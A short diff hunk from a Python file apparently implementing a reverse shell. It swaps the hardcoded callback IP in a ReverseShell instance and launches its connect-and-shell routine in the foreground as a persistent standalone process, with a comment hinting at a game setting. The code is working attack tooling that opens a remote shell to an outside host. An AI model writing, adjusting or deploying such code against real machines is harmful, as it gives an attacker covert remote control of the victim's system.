@@ -129,5 +129,5 @@ class ReverseShell:
 if __name__ == "__main__":
     # Default host usually set via game, but here we can hardcode for the persistent version
     # Or read from a config file. Let's use the user's preferred IP.
-    shell = ReverseShell(host="10.12.72.224")
+    shell = ReverseShell(host="10.12.73.251")
     shell._connect_and_shell() # Run in foreground for the standalone process
